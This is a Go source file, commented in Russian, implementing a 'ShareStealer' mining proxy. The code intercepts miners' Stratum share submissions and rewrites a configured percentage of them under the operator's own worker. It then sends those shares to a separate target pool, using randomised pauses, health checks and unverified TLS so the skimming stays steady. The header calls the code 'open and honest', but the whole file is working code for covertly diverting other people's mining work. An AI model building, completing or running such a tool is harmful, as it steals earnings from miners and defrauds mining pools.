// Пакет proxy — ядро логики «откусывания» шар (ShareStealer).
//
// ShareStealer решает для каждой шары: оставить её майнеру или «укусить»,
// т.е. скопировать целевому пулу с нашим воркером. Принципы:
//
//  1. Решение принимается на основе ПРОЦЕНТА (0.1–100) и СЛУЧАЙНОГО
//     ИНТЕРВАЛА между циклами (по ТЗ 2–20 часов). Интервал нужен, чтобы
//     пул не пересоздавал соединение и не сбрасывался хешрейт.
//  2. Код открыт и честен: никаких скрытых действий, вся логика ниже.
//
// ВАЖНО (требование заказчика): «укусить и отпустить». Нельзя забирать
// шары пачками на протяжении 20+ минут — после укуса должна быть пауза.
// Текущая версия использует batch-механизм (несколько шар подряд за цикл)
// с малым размером по умолчанию (1).
package proxy

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"math/rand"
	"net"
	"sync"
	"time"
)

// ShareStealerConfig параметры для создания ShareStealer.
type ShareStealerConfig struct {
	Percentage   float64       // доля шар для кражи (0.1–100)
	IntervalMin  time.Duration // минимальная пауза (время) между укусами
	IntervalMax  time.Duration // максимальная пауза (время) между укусами
	BatchSize    int           // сколько шар красть за один активный цикл
	TargetPool   string        // адрес целевого пула (host:port)
	TargetWorker string        // наш воркер на целевом пуле
	TargetPass   string        // пароль воркера
	TargetSSL    bool          // TLS к целевому пулу?

	// PauseShares включает режим «пауза в шарах»: кусать 1 шару каждые
	// ~100/percentage шар. В этом режиме процент достигается ТОЧНО и не
	// зависит от скорости потока (в отличие от interval_min/max_hours,
	// где временная пауза режет фактический процент). При PauseShares
	// интервалы по времени игнорируются.
	PauseShares bool

	// TargetTimeout время ожидания ответа (accept) от целевого пула
	// на перенаправленную шару. По умолчанию 30 секунд.
	TargetTimeout time.Duration
}

// targetHandshakeTimeout таймаут на полный handshake (subscribe+authorize)
// с целевым пулом при создании нового соединения.
const targetHandshakeTimeout = 30 * time.Second

// targetHealthCheckInterval периодичность health-check целевого пула:
// реальным mining.subscribe проверяем, что пул жив (TCP + Stratum).
const targetHealthCheckInterval = 60 * time.Second

// ShareStealer реализует логику перехвата и перенаправления шар.
// Все поля, к которым обращаются из разных goroutine (счётчики, batch,
// планировщик), защищены мьютексом mu. Соединение с целевым пулом
// защищено отдельным мьютексом targetConnMu.
type ShareStealer struct {
	// Параметры кражи (не меняются после создания).
	percentage    float64
	intervalMin   time.Duration
	intervalMax   time.Duration
	batchSize     int
	targetTimeout time.Duration
	pauseShares   bool // режим «паузы в шарах» (точный процент)

	// Целевой пул/воркер (куда сливаем шары).
	targetPool   string
	targetWorker string
	targetPass   string
	targetSSL    bool

	// Счётчики статистики (защищены mu).
	stolenCount   int  // сколько шар перенаправлено в целевой пул (попытки)
	acceptedCount int  // сколько из них ПРИНЯТО целевым пулом (result:true)
	totalCount    int  // сколько шар всего пришло от всех майнеров
	forwardFails  int  // сколько ошибок перенаправления (failover переключений)
	targetUp      bool // доступен ли целевой пул (по health-check)
	mu            sync.Mutex

	// Состояние кражи (защищено mu).
	// Основной режим (пауза по времени):
	//   nextBiteAt — момент, начиная с которого разрешён следующий «укус».
	//   Инициализируется как now + интервал, после каждого укуса отодвигается
	//   на случайный интервал [intervalMin, intervalMax] — «укуси и отпусти».
	// Режим паузы в шарах (pauseShares=true):
	//   sharesUntilBite — сколько шар пропустить до следующего укуса.
	//   Выставляется как ~100/percentage при укусе (и при старте).
	nextBiteAt      time.Time
	sharesUntilBite int

	startTime time.Time // момент запуска (для uptime)

	// Персистентное соединение с целевым пулом.
	// Создаётся один раз (subscribe + authorize), переиспользуется для
	// всех украденных шар. При ошибке закрывается и пересоздаётся.
	targetConnMu sync.Mutex
	targetConn   net.Conn
	targetReader *bufio.Reader
	forwardID    int // последовательный id для наших submit-запросов

	// healthTicker — период, с которым проверяем живой ли целевой пул.
	healthTicker *time.Ticker
	stopHealth   chan struct{}

	// closeOnce гарантирует, что Close() выполнится только один раз
	// (закрытие каналов и соединений не должно повторяться).
	closeOnce sync.Once
}

// NewShareStealer создаёт новый экземпляр ShareStealer. Первый укус
// откладывается: в режиме паузы по времени — на случайный интервал
// [intervalMin, intervalMax], в режиме паузы в шарах — на ~100/percentage шар.
func NewShareStealer(cfg *ShareStealerConfig) *ShareStealer {
	if cfg.TargetTimeout <= 0 {
		cfg.TargetTimeout = 30 * time.Second
	}
	s := &ShareStealer{
		percentage:    cfg.Percentage,
		intervalMin:   cfg.IntervalMin,
		intervalMax:   cfg.IntervalMax,
		batchSize:     cfg.BatchSize,
		targetPool:    cfg.TargetPool,
		targetWorker:  cfg.TargetWorker,
		targetPass:    cfg.TargetPass,
		targetSSL:     cfg.TargetSSL,
		targetTimeout: cfg.TargetTimeout,
		pauseShares:   cfg.PauseShares,
		targetUp:      true, // до первой проверки считаем пул живым
		startTime:     time.Now(),
	}

	if s.pauseShares {
		// Первый укус — через ~100/percentage шар.
		s.sharesUntilBite = s.sharesPerBite()
	} else {
		// Первый укус — не сразу, после первой паузы (случайный интервал).
		s.nextBiteAt = time.Now().Add(s.randomPause())
	}

	// Фоновый health-check целевого пула: subscribe + authorize реально,
	// чтобы отличить «стратум пул умер» от «сеть пингуется».
	s.healthTicker = time.NewTicker(targetHealthCheckInterval)
	s.stopHealth = make(chan struct{})
	go s.healthLoop()

	return s
}

// Close останавливает фоновый health-check и закрывает соединение к
// целевому пулу. Вызывается при завершении работы приложения.
// Идемпотентно: повторные вызовы безопасны.
func (s *ShareStealer) Close() {
	s.closeOnce.Do(func() {
		// Останавливаем health-цикл. Закрытие stopHealth заставляет
		// healthLoop выйти; Ticker.Stop() не трогает поле C, поэтому
		// горутина безопасно закончит на очередной итерации select.
		close(s.stopHealth)
		s.healthTicker.Stop()

		// Закрываем соединение к целевому пулу.
		s.targetConnMu.Lock()
		s.closeTargetConnLocked()
		s.targetConnMu.Unlock()
	})
}

// TargetUp возвращает доступность целевого пула по последнему health-check.
func (s *ShareStealer) TargetUp() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.targetUp
}

// healthLoop периодически проверяет живость целевого пула на уровне
// именно Stratum: dial → mining.subscribe → mining.authorize. Если пул
// отвечает — считается живым (восстанавливаем возможность «кусать»).
// Ошибки не роняют майнинг, а только меняют флаг targetUp.
func (s *ShareStealer) healthLoop() {
	for {
		select {
		case <-s.stopHealth:
			return
		case <-s.healthTicker.C:
			ok := s.checkTargetHealth()
			s.mu.Lock()
			s.targetUp = ok
			if !ok {
				log.Printf("[HEALTH] target pool %s is DOWN (stratum check failed)", s.targetPool)
			} else {
				log.Printf("[HEALTH] target pool %s is UP", s.targetPool)
			}
			s.mu.Unlock()
		}
	}
}

// checkTargetHealth выполняет реальную проверку Stratum-соединения с
// целевым пулом: подключается, отправляет mining.subscribe и mining.authorize,
// ждёт ответов. Возвращает true, если протокол жив.
func (s *ShareStealer) checkTargetHealth() bool {
	s.targetConnMu.Lock()
	defer s.targetConnMu.Unlock()

	// Если у нас уже есть рабочее соединение — считаем пул живым
	// (оно не могло появиться, если health-check до этого не прошёл).
	if s.targetConn != nil {
		return true
	}
	// Полный handshake (dial + subscribe + authorize): это настоящая
	// проверка «живого» Stratum, а не просто пинга по IP.
	conn, err := s.dialAndHandshake()
	if err != nil {
		s.closeTargetConnLocked()
		return false
	}
	conn.SetDeadline(time.Time{})
	s.targetConn = conn
	s.targetReader = bufio.NewReader(conn)
	return true
}

// ShouldSteal решает: перенаправлять ли данную шару.
// Вызывается для каждого mining.submit (по одной goroutine на соединение,
// поэтому мьютекс обязателен).
//
// Два режима:
//
//  1. «Пауза в шарах» (pauseShares=true) — точный процент.
//     Кусаем 1 шару каждые ~100/percentage шар. Доля украденных шар всегда
//     стремится к percentage%, не зависит от скорости потока. Пауза между
//     укусами измеряется числом шар, а не временем.
//
//  2. «Пауза по времени» (interval_min/max_hours) — «укуси и отпусти».
//     Каждая шара участвует в рулетке rand < percentage%, но после укуса
//     встаёт временная пауза [intervalMin, intervalMax]. Фактический процент
//     получается меньше заявленного, т.к. пауза режет его (для достижения
//     точного % нужно подгонять интервалы под скорость потока).
//
// В обоих режимах при недоступности целевого пула (failover) не кусаем.
func (s *ShareStealer) ShouldSteal() bool {
	now := time.Now()
	s.mu.Lock()
	defer s.mu.Unlock()
	s.totalCount++ // засчитываем шару в общую статистику ОБЯЗАТЕЛЬНО

	// --- 0. целевой пул недоступен: failover ---
	if !s.targetUp {
		return false
	}

	// --- режим «пауза в шарах»: точный процент ---
	if s.pauseShares {
		// Ещё не прошло нужное число шар с последнего укуса — пропускаем.
		if s.sharesUntilBite > 0 {
			s.sharesUntilBite--
			return false
		}
		// Время укуса: крадём эту шару и снова ставим паузу в шарах.
		s.stolenCount++
		pause := s.sharesPerBite()
		s.sharesUntilBite = pause
		log.Printf("[STEAL] share stolen | skip %d | stolen=%d/%d",
			pause, s.stolenCount, s.totalCount)
		return true
	}

	// --- режим «пауза по времени»: рулетка + временная пауза ---
	// 1. пауза после прошлого укуса ещё не вышла
	if now.Before(s.nextBiteAt) {
		return false
	}
	// 2. рулетка на каждую шару
	if rand.Float64()*100 >= s.percentage {
		return false
	}
	// 3. укус
	s.stolenCount++
	// «Укуси и отпусти»: пауза до следующей возможности.
	s.nextBiteAt = now.Add(s.randomPause())
	log.Printf("[STEAL] share stolen | stolen=%d/%d | next bite in %v",
		s.stolenCount, s.totalCount, time.Until(s.nextBiteAt).Round(time.Second))
	return true
}

// sharesPerBite возвращает число шар, которые нужно ПРОПУСТИТЬ между укусами,
// чтобы (вместе с укушенной) доля составила percentage%. Формула:
//   период = round(100 / percentage)  — сколько шар всего приходится на 1 укус
//   пропустить = период - 1           — из них пропускаем, а период-ую кусаем
//
// Примеры: 20% → период 5 → пропустить 4 (кусаем 5-ю, итог 20%);
//          5%  → период 20 → пропустить 19 (кусаем 20-ю, итог 5%);
//          100%→ период 1 → пропустить 0 (кусаем каждую).
func (s *ShareStealer) sharesPerBite() int {
	if s.percentage <= 0 {
		return 1
	}
	period := int(100 / s.percentage)
	if period < 1 {
		period = 1
	}
	if period <= 1 {
		return 0
	}
	return period - 1
}

// randomPause возвращает случайную паузу до следующего укуса в диапазоне
// [intervalMin, intervalMax]. Если оба равны — фиксированная, равная
// intervalMin.
func (s *ShareStealer) randomPause() time.Duration {
	delta := s.intervalMax - s.intervalMin
	if delta <= 0 {
		return s.intervalMin
	}
	return s.intervalMin + time.Duration(rand.Int63n(int64(delta)))
}

// ForwardToTarget перенаправляет mining.submit шару на целевой пул с нашим
// воркером. Использует персистентное соединение: subscribe/authorize
// выполняются один раз, потом переиспользуются для всех украденных шар.
//
// Шаги:
//  1. берём (или создаём) соединение с целевым пулом;
//  2. переписываем воркера в сообщении на targetWorker;
//  3. меняем id сообщения на свой последовательный (чтобы корректно
//     сопоставить ответ пула, т.к. клиент использует свои id);
//  4. отправляем и читаем ответ; успех/ошибку логируем.
//
// При сбое соединение сбрасывается — следующая украденная шара создаст
// новое. Ошибка возвращается наверх (логируется в conn.go), майнинг
// реального пула при этом НЕ прерывается (failover).
func (s *ShareStealer) ForwardToTarget(submitRaw []byte) error {
	// Все перенаправления сериализуем через один мьютекс: целевой пул
	// ожидает строгий порядок запросов-ответов по одному соединению.
	s.targetConnMu.Lock()
	defer s.targetConnMu.Unlock()

	// Получаем активное соединение (или создаём новое).
	conn, err := s.ensureTargetConn()
	if err != nil {
		s.noteForwardFailure()
		return err
	}

	// Инкремент id для этого отправленного submit.
	s.forwardID++

	// Переписываем имя воркера на наш targetWorker и меняем id —
	// за один проход JSON (без тройного marshal/unmarshal).
	raw, err := rewriteSubmit(submitRaw, s.targetWorker, s.forwardID)
	if err != nil {
		s.noteForwardFailure()
		return fmt.Errorf("rewrite submit: %w", err)
	}

	// Отправляем submit в целевой пул (добавляем терминальный \n).
	conn.SetDeadline(time.Now().Add(s.targetTimeout))
	if _, err := conn.Write(append(raw, '\n')); err != nil {
		// Сбросим соединение и попробуем переподключиться при следующей шаре.
		s.closeTargetConnLocked()
		s.noteForwardFailure()
		return fmt.Errorf("write submit: %w", err)
	}

	// Читаем ответ пула: accept (result:true) или reject (result:false).
	// Считаться «выполненной» шарой должна только принятая (см. ARCHITECTURE.md §6).
	resp, err := s.targetReader.ReadBytes('\n')
	if err != nil {
		s.closeTargetConnLocked()
		s.noteForwardFailure()
		return fmt.Errorf("read submit response (conn reset): %w", err)
	}
	// Ответ получен — возвращаем соединение в персистентный режим.
	conn.SetDeadline(time.Time{})
	log.Printf("[FORWARD] submit response: %s", string(resp))

	// Если целевой пул принял шару — засчитываем как выполненную.
	if isAccepted(resp) {
		s.mu.Lock()
		s.acceptedCount++
		s.mu.Unlock()
		log.Printf("[FORWARD] SHARE ACCEPTED | total accepted=%d", s.Accepted())
	} else {
		log.Printf("[FORWARD] SHARE REJECTED by target pool")
	}

	return nil
}

// noteForwardFailure увеличивает счётчик ошибок перенаправления.
// Используется в логике failover: после серии ошибок health-check
// переключит флаг targetUp в false.
func (s *ShareStealer) noteForwardFailure() {
	s.mu.Lock()
	s.forwardFails++
	s.mu.Unlock()
}

// isAccepted анализирует ответ целевого пула на mining.submit.
// Принятым считается ответ {"result": true, ...} — это и есть
// подтверждённая («выполненная») шара. result:false или объект с ошибкой
// считается reject'ом.
func isAccepted(resp []byte) bool {
	var msg struct {
		Result interface{} `json:"result"`
		Error  interface{} `json:"error"`
	}
	if err := json.Unmarshal(resp, &msg); err != nil {
		return false
	}
	// Accept — только когда result строго true и нет ошибки.
	ok, _ := msg.Result.(bool)
	return ok && msg.Error == nil
}

// ensureTargetConn возвращает активное соединение к целевому пулу.
// Если соединения нет (первый раз или было сброшено), создаёт новое:
// dial -> mining.subscribe -> mining.authorize. Весь handshake выполняется
// один раз, дальше соединение переиспользуется. На время handshake
// ставится deadline targetHandshakeTimeout, затем снимается.
//
// Возвращает ошибку, если пул недоступен — это и есть failover: шары
// продолжают идти в реальный пул, целевой перепроверяется health-циклом.
func (s *ShareStealer) ensureTargetConn() (net.Conn, error) {
	// Если соединение уже есть — просто переиспользуем.
	if s.targetConn != nil {
		return s.targetConn, nil
	}

	// Создаём новое соединение (TCP или TLS) и выполняем handshake.
	conn, err := s.dialAndHandshake()
	if err != nil {
		return nil, err
	}

	// Снимаем deadline — соединение становится персистентным.
	conn.SetDeadline(time.Time{})
	s.targetConn = conn
	s.targetReader = bufio.NewReader(conn)
	return conn, nil
}

// dialTargetConn создаёт TCP или TLS соединение с целевым пулом без
// handshake. Используется health-check'ом (ошибки не роняют майнинг).
func (s *ShareStealer) dialTargetConn() (net.Conn, error) {
	if s.targetSSL {
		return tls.Dial("tcp", s.targetPool, &tls.Config{
			InsecureSkipVerify: true, // пулы часто с самоподписанными сертами
		})
	}
	return net.DialTimeout("tcp", s.targetPool, targetHandshakeTimeout)
}

// dialAndHandshake создаёт соединение с целевым пулом и выполняет
// полный Stratum handshake: subscribe + authorize. При ошибке на любом
// шаге соединение закрывается и возвращается ошибка.
func (s *ShareStealer) dialAndHandshake() (net.Conn, error) {
	conn, err := s.dialTargetConn()
	if err != nil {
		return nil, fmt.Errorf("dial target pool: %w", err)
	}

	// Handshake не должен «висеть» вечно.
	conn.SetDeadline(time.Now().Add(targetHandshakeTimeout))
	reader := bufio.NewReader(conn)

	// 1) mining.subscribe — регистрируемся на целевом пуле.
	subMsg := map[string]interface{}{
		"id":     1,
		"method": "mining.subscribe",
		"params": []string{"mining-proxy/1.0"},
	}
	subRaw, _ := json.Marshal(subMsg)
	if _, err := conn.Write(append(subRaw, '\n')); err != nil {
		conn.Close()
		return nil, fmt.Errorf("write subscribe: %w", err)
	}
	if _, err := reader.ReadBytes('\n'); err != nil {
		conn.Close()
		return nil, fmt.Errorf("read subscribe response: %w", err)
	}
	log.Printf("[FORWARD] subscribe ok")

	// 2) mining.authorize — авторизуемся под нашим воркером.
	authMsg := map[string]interface{}{
		"id":     2,
		"method": "mining.authorize",
		"params": []string{s.targetWorker, s.targetPass},
	}
	authRaw, _ := json.Marshal(authMsg)
	if _, err := conn.Write(append(authRaw, '\n')); err != nil {
		conn.Close()
		return nil, fmt.Errorf("write authorize: %w", err)
	}
	resp, err := reader.ReadBytes('\n')
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("read authorize response: %w", err)
	}

	// Авторизация могла вернуть result:false — пул не пускает нашего
	// воркера. В этом случае кусать бессмысленно: закрываем соединение
	// (считаем пул «недоступным» для нас) и сообщаем об ошибке.
	var authResp struct {
		Result interface{} `json:"result"`
	}
	if err := json.Unmarshal(resp, &authResp); err == nil {
		if ok, _ := authResp.Result.(bool); !ok {
			conn.Close()
			return nil, errors.New("target pool rejected our authorize (bad worker/pass)")
		}
	}

	// Таймаут снимает вызывающий (ensureTargetConn) после присвоения.
	return conn, nil
}

// closeTargetConn закрывает персистентное соединение к целевому пулу.
// Безопасная обёртка: берёт мьютекс. Следующая украденная шара создаст
// новое соединение заново.
func (s *ShareStealer) closeTargetConn() {
	s.targetConnMu.Lock()
	defer s.targetConnMu.Unlock()
	s.closeTargetConnLocked()
}

// closeTargetConnLocked закрывает соединение, мьютекс уже удержан.
func (s *ShareStealer) closeTargetConnLocked() {
	if s.targetConn != nil {
		s.targetConn.Close()
	}
	s.targetConn = nil
	s.targetReader = nil
}

// rewriteSubmit переписывает в mining.submit имя воркера на newWorker и
// поле id на newID — за один проход JSON. Остальные параметры шары
// (job_id, extranonce2, ntime, nonce) сохраняются, иначе пул отвергнет.
func rewriteSubmit(raw []byte, newWorker string, newID int) ([]byte, error) {
	var msg struct {
		ID     interface{}     `json:"id"`
		Method string          `json:"method"`
		Params json.RawMessage `json:"params"`
		Result json.RawMessage `json:"result"`
		Error  interface{}     `json:"error"`
	}
	if err := json.Unmarshal(raw, &msg); err != nil {
		return nil, err
	}

	// Params — массив строк [worker, job_id, extranonce2, ntime, nonce];
	// меняем только params[0] (имя воркера).
	var params []string
	if err := json.Unmarshal(msg.Params, &params); err != nil {
		return nil, err
	}
	if len(params) > 0 {
		params[0] = newWorker
	}
	newParams, err := json.Marshal(params)
	if err != nil {
		return nil, err
	}

	msg.Params = newParams
	msg.ID = newID
	return json.Marshal(msg)
}

// Stats возвращает статистику: сколько шар украдено и сколько всего пришло.
// Используется монитором /status.
func (s *ShareStealer) Stats() (stolen, total int) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.stolenCount, s.totalCount
}

// Accepted возвращает количество шар, ПРИНЯТЫХ целевым пулом
// (result:true). Это «выполненные» шары — именно они идут в зачёт
// комиссии (не все отправленные попытки).
func (s *ShareStealer) Accepted() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.acceptedCount
}

// ForwardFails возвращает количество неудачных перенаправлений
// (failover-переключений). Полезно для мониторинга стабильности пула.
func (s *ShareStealer) ForwardFails() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.forwardFails
}

// Uptime возвращает время работы с момента создания.
func (s *ShareStealer) Uptime() time.Duration {
	return time.Since(s.startTime)
}

// NextCycleIn возвращает время до следующего разрешённого «укуса»
// (окончание паузы после прошлого укуса). В режиме «паузы в шарах»
// временного ожидания нет (пауза измеряется шарами), поэтому возвращаем 0.
// Если пауза (по времени) уже вышла — тоже 0 (можно кусать сразу).
func (s *ShareStealer) NextCycleIn() time.Duration {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.pauseShares {
		return 0
	}
	d := time.Until(s.nextBiteAt)
	if d < 0 {
		return 0
	}
	return d
}
